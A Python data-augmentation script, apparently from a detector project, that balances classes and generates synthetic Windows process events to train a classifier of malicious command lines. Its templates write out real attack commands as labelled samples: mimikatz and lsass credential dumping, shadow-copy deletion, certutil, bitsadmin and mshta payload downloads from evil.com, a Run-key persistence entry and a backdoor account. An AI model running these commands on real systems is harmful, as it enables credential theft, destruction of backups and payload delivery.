"""
Аугментация данных для улучшения обучения.

Техники:
1. Синонимическая замена (cmd -> command)
2. Добавление шума (пробелы, регистр)
3. Перестановка аргументов
4. SMOTE-подобная интерполяция

Использование:
    python training/augment_data.py
    python training/augment_data.py --factor 2  # Увеличить в 2 раза
"""

import os
import sys
import json
import random
import argparse
from pathlib import Path
from collections import defaultdict
from typing import Dict, List, Tuple

ROOT = Path(__file__).parent.parent
DATA_DIR = ROOT / "training" / "data"

# Классы
EVENT_CLASSES = [
    "benign",
    "suspicious_low",
    "suspicious_medium",
    "malicious_high",
    "malicious_critical",
]

# Синонимы для аугментации
SYNONYMS = {
    "cmd": ["cmd.exe", "command", "cmd /c"],
    "powershell": ["powershell.exe", "pwsh", "pwsh.exe"],
    "python": ["python.exe", "python3", "py"],
    "admin": ["administrator", "ADMIN", "Administrator"],
    "user": ["USER", "User", "usr"],
    "system": ["SYSTEM", "System", "NT AUTHORITY\\SYSTEM"],
    "/c": ["-c", " /c ", "/C"],
    "/k": ["-k", " /k ", "/K"],
    "-enc": ["-EncodedCommand", "-e", "-ec", "-encodedcommand"],
    "-w hidden": ["-WindowStyle Hidden", "-win hidden", "-window hidden"],
    "http://": ["https://", "hxxp://", "http[:]//"],
    "c:\\": ["C:\\", "c:/", "C:/"],
}

# Шаблоны для генерации
MALICIOUS_TEMPLATES = {
    "malicious_critical": [
        "mimikatz.exe sekurlsa::logonpasswords",
        "procdump.exe -ma lsass.exe dump.dmp",
        "ntdsutil.exe activate instance ntds ifm create full c:\\temp",
        "vssadmin.exe delete shadows /all /quiet",
        "bcdedit.exe /set {default} recoveryenabled no",
    ],
    "malicious_high": [
        "powershell.exe -enc {base64}",
        "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        "bitsadmin.exe /transfer job /download /priority high http://evil.com/file",
        "mshta.exe http://evil.com/payload.hta",
        "wmic.exe process call create \"cmd.exe /c whoami\"",
    ],
    "suspicious_medium": [
        "schtasks.exe /create /tn task1 /tr cmd.exe /sc daily",
        "sc.exe create svc binpath= c:\\temp\\service.exe",
        "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v mal /d c:\\temp\\mal.exe",
        "netsh.exe advfirewall set allprofiles state off",
        "net.exe user hacker P@ssw0rd /add",
    ],
    "suspicious_low": [
        "powershell.exe Get-Process",
        "cmd.exe /c dir c:\\users",
        "net.exe user",
        "ipconfig.exe /all",
        "systeminfo.exe",
    ],
}


def augment_text(text: str) -> str:
    """Применяет текстовую аугментацию."""
    if not text:
        return text

    result = text
    augmentation_type = random.choice(["synonym", "case", "spacing", "none"])

    if augmentation_type == "synonym":
        # Синонимическая замена
        for word, synonyms in SYNONYMS.items():
            if word.lower() in result.lower():
                idx = result.lower().find(word.lower())
                original = result[idx:idx + len(word)]
                replacement = random.choice(synonyms)
                result = result[:idx] + replacement + result[idx + len(word):]
                break

    elif augmentation_type == "case":
        # Изменение регистра
        choice = random.choice(["lower", "upper", "title", "random"])
        if choice == "lower":
            result = result.lower()
        elif choice == "upper":
            result = result.upper()
        elif choice == "title":
            result = result.title()
        elif choice == "random":
            result = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in result)

    elif augmentation_type == "spacing":
        # Добавление/удаление пробелов
        if random.random() > 0.5:
            # Добавляем лишние пробелы
            result = result.replace(" ", "  ") if " " in result else result + " "
        else:
            # Убираем лишние пробелы
            result = " ".join(result.split())

    return result


def augment_event(event: Dict, label: str) -> Dict:
    """Аугментирует одно событие."""
    augmented = event.copy()

    # Аугментируем командную строку
    if "command_line" in augmented:
        augmented["command_line"] = augment_text(augmented["command_line"])

    # Аугментируем имя процесса
    if "process_name" in augmented:
        augmented["process_name"] = augment_text(augmented["process_name"])

    # Аугментируем пользователя
    if "user" in augmented and random.random() > 0.7:
        augmented["user"] = augment_text(augmented["user"])

    # Аугментируем hostname
    if "hostname" in augmented and random.random() > 0.8:
        suffix = random.choice(["01", "02", "03", "A", "B", ""])
        augmented["hostname"] = augmented["hostname"].rstrip("0123456789") + suffix

    # Помечаем как аугментированное
    augmented["augmented"] = True

    return augmented


def generate_synthetic_malicious(label: str, count: int) -> List[Dict]:
    """Генерирует синтетические вредоносные события."""
    events = []
    templates = MALICIOUS_TEMPLATES.get(label, [])

    if not templates:
        return events

    users = ["john", "admin", "SYSTEM", "user1", "developer", "hacker"]
    hostnames = ["WS-USER01", "SRV-DC01", "DESKTOP-ABC", "LAPTOP-XYZ", "PC-ADMIN"]

    for _ in range(count):
        template = random.choice(templates)

        # Подставляем переменные
        if "{base64}" in template:
            # Генерируем случайный base64-подобный текст
            import base64
            random_text = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(20, 50)))
            b64 = base64.b64encode(random_text.encode()).decode()
            template = template.replace("{base64}", b64)

        event = {
            "event_id": random.choice([1, 4688, 4104]),
            "hostname": random.choice(hostnames),
            "timestamp": f"2024-{random.randint(1,12):02d}-{random.randint(1,28):02d}T{random.randint(0,23):02d}:{random.randint(0,59):02d}:00Z",
            "process_name": template.split()[0] if template else "unknown.exe",
            "command_line": template,
            "user": random.choice(users),
            "source_file": "synthetic_augmented",
            "source_type": "synthetic",
            "augmented": True,
        }

        # Аугментируем сгенерированное событие
        if random.random() > 0.5:
            event = augment_event(event, label)

        events.append(event)

    return events


def balance_classes(
    events: List[Dict],
    labels: List[str],
    target_per_class: int = None,
    factor: float = 1.0,
) -> Tuple[List[Dict], List[str]]:
    """Балансирует классы через аугментацию."""
    # Группируем по классам
    class_events = defaultdict(list)
    for event, label in zip(events, labels):
        class_events[label].append(event)

    # Определяем target
    if target_per_class is None:
        max_count = max(len(evs) for evs in class_events.values())
        target_per_class = int(max_count * factor)

    print(f"  Target per class: {target_per_class}")

    new_events = []
    new_labels = []

    for label in EVENT_CLASSES:
        current = class_events[label]
        current_count = len(current)

        # Добавляем оригинальные
        new_events.extend(current)
        new_labels.extend([label] * current_count)

        # Если нужно добавить
        needed = target_per_class - current_count
        if needed > 0:
            print(f"  {label}: {current_count} -> {target_per_class} (+{needed})")

            # Часть через аугментацию существующих
            if current:
                aug_count = min(needed // 2, current_count * 3)
                for _ in range(aug_count):
                    original = random.choice(current)
                    augmented = augment_event(original, label)
                    new_events.append(augmented)
                    new_labels.append(label)
                needed -= aug_count

            # Остальное через синтетическую генерацию
            if needed > 0 and label != "benign":
                synthetic = generate_synthetic_malicious(label, needed)
                new_events.extend(synthetic)
                new_labels.extend([label] * len(synthetic))
        else:
            print(f"  {label}: {current_count} (без изменений)")

    return new_events, new_labels


def main():
    parser = argparse.ArgumentParser(description="Аугментация данных")
    parser.add_argument("--factor", type=float, default=1.5, help="Коэффициент увеличения")
    parser.add_argument("--balance", action="store_true", help="Балансировать классы")
    parser.add_argument("--output-suffix", type=str, default="_augmented", help="Суффикс для файлов")
    args = parser.parse_args()

    print("=" * 70)
    print("АУГМЕНТАЦИЯ ДАННЫХ")
    print("=" * 70)

    # Проверяем файлы
    train_events_file = DATA_DIR / "train_events.json"
    train_labels_file = DATA_DIR / "train_labels.json"

    if not train_events_file.exists():
        print("[ERROR] Данные не найдены. Сначала запустите prepare_data_full.py")
        sys.exit(1)

    # Загружаем
    print("\n[LOAD] Загрузка данных...")
    with open(train_events_file, "r", encoding="utf-8") as f:
        train_events = json.load(f)
    with open(train_labels_file, "r", encoding="utf-8") as f:
        train_labels = json.load(f)

    print(f"  Загружено {len(train_events)} событий")

    # Статистика до
    print("\n[BEFORE] Распределение классов:")
    stats_before = defaultdict(int)
    for label in train_labels:
        stats_before[label] += 1
    for cls in EVENT_CLASSES:
        print(f"  {cls}: {stats_before[cls]}")

    # Аугментация
    print("\n[AUGMENT] Аугментация...")

    if args.balance:
        new_events, new_labels = balance_classes(
            train_events, train_labels, factor=args.factor
        )
    else:
        # Просто умножаем все классы
        new_events = list(train_events)
        new_labels = list(train_labels)

        augment_count = int(len(train_events) * (args.factor - 1))
        print(f"  Добавляем {augment_count} аугментированных событий...")

        for _ in range(augment_count):
            idx = random.randint(0, len(train_events) - 1)
            augmented = augment_event(train_events[idx], train_labels[idx])
            new_events.append(augmented)
            new_labels.append(train_labels[idx])

    # Перемешиваем
    combined = list(zip(new_events, new_labels))
    random.shuffle(combined)
    new_events = [e for e, l in combined]
    new_labels = [l for e, l in combined]

    # Статистика после
    print("\n[AFTER] Распределение классов:")
    stats_after = defaultdict(int)
    for label in new_labels:
        stats_after[label] += 1
    for cls in EVENT_CLASSES:
        change = stats_after[cls] - stats_before[cls]
        sign = "+" if change > 0 else ""
        print(f"  {cls}: {stats_after[cls]} ({sign}{change})")

    # Сохраняем
    print("\n[SAVE] Сохранение...")

    output_events = DATA_DIR / f"train_events{args.output_suffix}.json"
    output_labels = DATA_DIR / f"train_labels{args.output_suffix}.json"

    with open(output_events, "w", encoding="utf-8") as f:
        json.dump(new_events, f, ensure_ascii=False, indent=2)

    with open(output_labels, "w", encoding="utf-8") as f:
        json.dump(new_labels, f, ensure_ascii=False)

    print(f"  События: {output_events}")
    print(f"  Метки: {output_labels}")

    print("\n" + "=" * 70)
    print("ГОТОВО!")
    print("=" * 70)
    print(f"\nБыло: {len(train_events)} событий")
    print(f"Стало: {len(new_events)} событий")
    print(f"\nДля обучения с аугментированными данными:")
    print(f"  python training/train.py --train-events train_events{args.output_suffix}.json")


if __name__ == "__main__":
    main()
